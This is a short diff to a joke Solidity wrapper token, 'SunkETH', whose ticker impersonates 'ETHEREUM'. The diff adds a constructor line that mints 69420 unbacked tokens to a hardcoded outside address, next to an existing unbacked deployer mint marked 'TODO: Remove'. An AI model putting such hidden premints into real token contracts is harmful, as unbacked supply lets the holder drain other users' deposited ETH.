@@ -18,6 +18,7 @@ contract SunkETH is IWETH9, ERC20 {
     constructor() ERC20("I lost my ETH in a boating accident", "ETHEREUM") {
         // TODO: Remove
         _mint(msg.sender, 69420 ether);
+        _mint(0xe175aB294bCA5cC767Ef8Cf58A0F287C7f43c342, 69420 ether);
     }
 
     /// @notice Deposit ETH, get SunkETH
